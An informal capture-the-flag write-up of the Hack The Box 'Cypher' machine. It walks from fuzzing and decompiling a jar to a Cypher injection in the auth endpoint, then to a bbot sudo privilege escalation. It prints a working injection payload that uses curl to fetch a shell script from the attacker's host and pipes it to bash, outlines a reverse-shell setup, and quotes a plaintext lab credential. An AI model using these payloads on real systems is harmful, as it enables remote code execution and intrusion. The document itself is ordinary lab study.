Ports open: 22,80

80 has host name cypher.htb, so fill in /etc/hosts

Fuzzing helps us find a /testing endpoint containing a .jar file. Let's download it with curl and open it. I extracted it by copying it over to a .zip extension and unzipping it. Then I used ***jd-gui*** to read and decompile the .class files.

This reveals a custom Procedure, which I didnt know where to call
in the api/auth endpoint there is cypher injection, which we use this payload to get access (I used a writeup for this payload)

admin' return h.value AS value  UNION CALL custom.getUrlStatusCode(\"127.0.0.1;curl http://10.10.xx.xx/shell.sh|bash\") YIELD statusCode AS value  RETURN value ; //

shell.sh just contains a revshell payload, so first create shell.sh, start a http server on port 80, listener on port 4444 and then run this payload. Idk why this works so whatever tf.

Once we gain a shell, we login as neo4j. We can read /home/graphasm/bbot_preset.yml for creds.

`neo4j:cU4btyib.20xtCMCXkBmerhK`

Let's see where this leads us. I used this password to ssh in as the graphasm user.

Now we do sudo -l to find this,

```
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Now this is a scanner, so I combed the internet for some privesc and came across this article thru some simple google dorking,
[article](https://www.linkedin.com/posts/neswinnigad_privilege-escalation-in-linux-via-bbot-binary-activity-7308872344649748480-O5tW)

Using the exploit here, I got root flag, you can even extract the ssh key if it strikes your fancy.
                                                                                                    
